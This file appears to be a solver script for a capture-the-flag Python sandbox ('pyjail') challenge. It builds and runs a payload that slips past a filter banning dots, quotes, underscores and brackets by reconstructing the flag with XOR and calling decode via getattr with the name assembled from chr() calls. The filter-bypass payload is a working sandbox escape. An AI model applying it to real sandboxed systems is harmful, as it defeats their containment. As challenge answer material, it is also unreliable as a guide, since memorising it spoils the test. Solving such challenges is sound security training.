#!/usr/bin/env python3
"""
Real solver for misc_04_pyjail_ast_restricted_subset.

Reads ONLY dist/jail.py. It constructs a payload that satisfies the jail's
restricted-AST rules (no '.', no '_', no quotes, no brackets; Attribute,
Subscript and string literals forbidden by the AST whitelist) and feeds it to
the shipped jail on stdin. The jail executes it and prints the flag.

The escape:
  * the jail exposes `data` (the flag XOR a keystream ks[i] = (S + i*T) % 256),
    plus S, T, enumerate, getattr, chr and bytes;
  * `bytes(c ^ ((S + i*T) % 256) for i,c in enumerate(data))` rebuilds the flag
    bytes without any banned character;
  * `.decode()` is impossible directly ('.' is banned), so we call it via
    getattr(obj, "decode")() with the attribute name assembled from chr()+...,
    the classic dot/quote-filter bypass.

Does not contain the flag and never reads the ./flag file.
"""
import argparse
import os
import subprocess
import sys


def build_payload():
    # "decode" assembled from chr() so no string literal / no '.' is used
    name = "+".join("chr(%d)" % ord(c) for c in "decode")
    gen = "bytes(c ^ ((S + i*T) % 256) for i,c in enumerate(data))"
    return "getattr(%s, %s)()" % (gen, name)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dist", default="./dist")
    args = ap.parse_args()
    jail = os.path.join(args.dist, "jail.py")
    payload = build_payload()
    proc = subprocess.run([sys.executable, jail], input=payload,
                          capture_output=True, text=True)
    out = proc.stdout.strip()
    if out.startswith("REJECTED") or out.startswith("ERROR"):
        sys.stderr.write("jail did not accept payload: %s\n" % out)
        sys.exit(2)
    print(out)


if __name__ == "__main__":
    main()
